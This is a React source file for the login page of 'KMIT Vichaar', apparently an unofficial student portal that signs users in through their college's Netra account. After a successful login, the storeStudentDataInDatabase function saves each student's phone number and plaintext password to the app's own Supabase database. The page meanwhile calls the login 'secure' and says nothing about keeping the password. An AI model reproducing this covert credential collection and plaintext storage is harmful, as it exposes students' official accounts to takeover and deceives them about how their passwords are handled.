import React, { useState, useEffect, useCallback, useRef } from 'react'
import { useNavigate, Link } from 'react-router-dom'
import { useTheme } from '@/contexts/ThemeContext'
import { GraduationCap, Moon, Sun, Eye, EyeOff, Smartphone, Lock, ArrowLeft, RefreshCw } from 'lucide-react'
import toast from 'react-hot-toast'
import apiClient from '@/lib/api'
import ErrorBoundary from '@/components/ErrorBoundary'
import { supabaseDB } from '@/lib/supabase'

// TypeScript declarations for hCaptcha
declare global {
  interface Window {
    hcaptcha: {
      render: (container: string | HTMLElement, options: any) => string
      reset: () => void
      getResponse: () => string
      remove: (widgetId: string) => void
      execute: () => void
      ready?: (callback: () => void) => void
    }
  }
}

export default function RegisterPage() {
  const [phoneNumber, setPhoneNumber] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [hcaptchaToken, setHcaptchaToken] = useState('')
  const [hcaptchaLoaded, setHcaptchaLoaded] = useState(false)
  const [hcaptchaError, setHcaptchaError] = useState(false)
  const hcaptchaRef = useRef<HTMLDivElement>(null)
  const hasInitializedRef = useRef(false) // Track if we've ever initialized
  
  const { theme, toggleTheme } = useTheme()
  const navigate = useNavigate()

  const handleHcaptchaVerify = useCallback((token: string) => {
    console.log('hCaptcha verified:', token)
    setHcaptchaToken(token)
    toast.success('Security verification completed! ✅')
  }, [])

  const handleHcaptchaExpired = useCallback(() => {
    console.log('hCaptcha expired')
    setHcaptchaToken('')
    toast.error('Security verification expired. Please verify again.')
  }, [])

  const handleHcaptchaError = useCallback(() => {
    console.log('hCaptcha error')
    setHcaptchaToken('')
    toast.error('Security verification failed. Please try again.')
  }, [])

  // Store only credentials in database after successful login
  const storeStudentDataInDatabase = async (mobileNumber: string, password: string, kmitResponse: any) => {
    try {
      console.log('💾 Storing student credentials in database...')
      
      // Only store credentials for now - profile will be updated later with complete data
      const { error: credError } = await supabaseDB.insertCredentials(mobileNumber, password)
      if (credError) {
        console.error('Failed to store credentials:', credError)
        // Don't fail the login if database storage fails
        return
      }
      
      // Create a minimal profile entry with just mobile number for now
      // This will be updated with complete data when profile is fetched in dashboard
      const minimalProfileData = {
        mobile_number: mobileNumber,
        hall_ticket: '', // Will be updated with actual hall ticket
        name: '', // Will be updated with actual name
        branch: '', // Will be updated with actual branch
        year: '', // Will be updated with actual year
        semester: '', // Will be updated with actual semester
        profile_data: null // Will be updated with complete profile
      }
      
      // Store minimal profile data
      const { error: profileError } = await supabaseDB.insertProfile(minimalProfileData)
      if (profileError) {
        console.error('Failed to store minimal profile:', profileError)
        // Don't fail the login if database storage fails
        return
      }
      
      console.log('✅ Student credentials stored in database successfully')
      console.log('📝 Profile will be updated with complete data when fetched in dashboard')
      
    } catch (error) {
      console.error('Error storing student data:', error)
      // Don't fail the login if database storage fails
    }
  }

  // Simple hCaptcha initialization
  useEffect(() => {
    if (!window.hcaptcha || !hcaptchaRef.current) return
    
    try {
      console.log('Initializing hCaptcha...')
      
      const widgetId = window.hcaptcha.render(hcaptchaRef.current, {
        sitekey: '898273e0-27c2-47fa-bf84-7bb23b6432d4',
        callback: handleHcaptchaVerify,
        'expired-callback': handleHcaptchaExpired,
        'error-callback': handleHcaptchaError,
        theme: theme === 'dark' ? 'dark' : 'light'
      })
      
      console.log('hCaptcha initialized with ID:', widgetId)
      setHcaptchaLoaded(true)
      
    } catch (error) {
      console.error('Failed to initialize hCaptcha:', error)
      setHcaptchaError(true)
    }
  }, [theme])

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!phoneNumber.trim() || !password.trim()) {
      toast.error('Please fill in all fields')
      return
    }

    if (!hcaptchaToken) {
      toast.error('Please complete the security verification')
      return
    }

    setIsLoading(true)
    
    try {
      // Real login attempt with hCaptcha token
      const response = await apiClient.loginWithToken({
        username: phoneNumber,
        password: password,
        application: 'netra',
        token: hcaptchaToken
      })
      
      if (response && !response.Error) {
        // Store student data in database for future searches
        await storeStudentDataInDatabase(phoneNumber, password, response)
        
        toast.success(`Welcome back, ${response.name || 'Student'}! 🎉`)
        navigate('/dashboard')
      } else {
        toast.error('Login failed. Please check your credentials.')
      }
    } catch (error: any) {
      console.error('Login error:', error)
      toast.error(error.message || 'Login failed. Please try again.')
      
      // Reset hCaptcha on error
      setHcaptchaToken('')
      if (window.hcaptcha) {
        window.hcaptcha.reset()
      }
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      {/* Theme Toggle */}
      <button
        onClick={toggleTheme}
        className="fixed top-6 right-6 p-3 rounded-full bg-white/10 backdrop-blur-sm border border-white/20 hover:bg-white/20 transition-all duration-200 z-50"
      >
        {theme === 'dark' ? <Sun className="w-5 h-5 text-yellow-400" /> : <Moon className="w-5 h-5 text-blue-600" />}
      </button>

      <div className="w-full max-w-md">
        {/* Header */}
        <div className="text-center mb-12">
          <div className="inline-flex items-center justify-center w-24 h-24 bg-gradient-to-br from-primary-500 to-secondary-600 rounded-full mb-8">
            <GraduationCap className="w-12 h-12 text-white" />
          </div>
          <h1 className="text-5xl font-bold bg-gradient-to-r from-primary-600 to-secondary-600 bg-clip-text text-transparent mb-4">
            KMIT VICHAAR
          </h1>
          <p className="text-xl text-gray-600 dark:text-gray-300">
            Login to KMIT System
          </p>
        </div>

        {/* Login Form */}
        <div className="card backdrop-blur-sm">
          <h2 className="text-2xl font-semibold text-center mb-8 text-gray-800 dark:text-white">
            Welcome Back
          </h2>
          
          <form onSubmit={handleLogin} className="space-y-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Phone Number (Netra)
              </label>
              <div className="relative">
                <Smartphone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                <input
                  type="tel"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  placeholder="Enter your phone number"
                  className="input-field pl-10"
                  required
                  autoFocus
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Password
              </label>
              <div className="relative">
                <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter your password"
                  className="input-field pl-10 pr-10"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 dark:hover:text-gray-300"
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            {/* hCaptcha */}
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Security Verification
              </label>
              
              {/* Simple hCaptcha container */}
              <div 
                ref={hcaptchaRef}
                className="flex justify-center min-h-[78px]"
                style={{ minHeight: '78px' }}
              >
                {!hcaptchaLoaded && !hcaptchaError && (
                  <div className="flex items-center justify-center p-4">
                    <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600 mr-3"></div>
                    <span className="text-gray-600 dark:text-gray-300">Loading security verification...</span>
                  </div>
                )}
                {hcaptchaError && (
                  <div className="text-center p-4">
                    <p className="text-red-600 dark:text-red-400 mb-3">
                      Failed to load security verification
                    </p>
                    <button
                      type="button"
                      onClick={() => window.location.reload()}
                      className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors"
                    >
                      Retry
                    </button>
                  </div>
                )}
              </div>
              
              {hcaptchaToken && (
                <p className="text-xs text-green-600 dark:text-green-400 mt-2 text-center">
                  ✅ Security verification completed
                </p>
              )}
              
              {/* Debug section - remove this later */}
              {/* The debug buttons and fallback hCaptcha are removed */}
            </div>

            <button
              type="submit"
              disabled={isLoading || !hcaptchaToken}
              className="btn-primary w-full text-lg py-4 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-white mr-3"></div>
                  Signing in...
                </div>
              ) : (
                'Sign In to KMIT'
              )}
            </button>
          </form>

          <div className="mt-6 text-center">
            <p className="text-gray-600 dark:text-gray-400 mb-4">
              Want to search without login?
            </p>
            <Link
              to="/"
              className="btn-secondary inline-block"
            >
              <ArrowLeft className="w-4 h-4 mr-2 inline" />
              Back to Search
            </Link>
          </div>

          <div className="mt-6 text-center">
            <p className="text-xs text-gray-500 dark:text-gray-400">
              🔒 Secure login using KMIT's official authentication system
            </p>
            <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
              This will give you access to your personal student data
            </p>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center mt-8">
          <p className="text-sm text-gray-500 dark:text-gray-400">
            © 2025 KMIT Vichaar. All rights reserved.
          </p>
        </div>
      </div>
    </div>
  )
}

